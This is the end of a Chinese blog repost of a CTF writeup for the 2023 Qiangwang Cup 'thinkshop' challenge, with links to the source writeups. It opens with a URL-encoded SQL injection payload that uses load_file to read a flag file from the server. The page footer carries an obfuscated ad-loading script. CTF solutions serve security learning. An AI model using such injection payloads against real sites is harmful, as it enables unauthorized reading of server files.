data`%3Dunhex('')/**/,`name`%3Dload_file('/fffflllaaaagggg')/**/where/**/id%3D1/**/or/**/1%3D1#=1&amp;id=1&amp;name=a&amp;price=100.00&amp;on_sale_time=2023-05-05T02%3A20%3A54&amp;image=1&amp;data=%27%0D%0Aa</pre> 
<p></p> 
<p class="img-center"><img alt="" height="241" src="https://images2.imgbox.com/e0/d5/CBGk58Qn_o.jpg" width="847"></p> 
<p></p> 
<p>参考原文链接：</p> 
<p><a href="https://mp.weixin.qq.com/s/ksGjGGeYjvWpgmRA5xyBpg" rel="nofollow" title="2023 强网杯 writeup by Arr3stY0u">2023 强网杯 writeup by Arr3stY0u</a></p> 
<p><a href="https://mp.weixin.qq.com/s/ZNbUGyYkLP0YWDGIVMN-Zw" rel="nofollow" title="2023年第七届强网杯全国网络安全挑战赛Writeup">2023年第七届强网杯全国网络安全挑战赛Writeup</a></p> 
<p><a href="https://mp.weixin.qq.com/s/zBWgPmK4edhkc153A7cvTw" rel="nofollow" title="[CTF复现计划]2023强网杯初赛 thinkshop[ping]">[CTF复现计划]2023强网杯初赛 thinkshop[ping]</a></p> 
<p>https://blog.csdn.net/qq_65165505/article/details/135044734</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/89dda9da43b17add91c173678b212786/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">小米相机包 徕卡/原生相机</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/d77a08d265d821622a82d72f13515169/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">一分钟搭建宠物用品小程序，快速实现电商创业</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>